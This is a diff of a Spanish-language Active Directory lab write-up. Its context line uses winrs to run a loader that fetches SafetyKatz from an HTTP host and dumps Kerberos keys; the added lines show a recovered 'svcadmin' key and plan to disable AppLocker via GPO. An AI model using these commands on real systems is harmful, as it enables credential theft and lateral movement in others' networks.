@@ -707,3 +707,7 @@ Una vez copiado el *Loader* ejecutaremos *SafetyKatz* a traves de *winrs*
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.97:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
 
+Obtenemos las credenciales de *svcadmin ->  6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011*
+
+Ahora deshabilitaremos el *AppLocker* en *dcorp-adminsrv* modificando la GPO
+Recordamos que nuestro usuario *studen97*
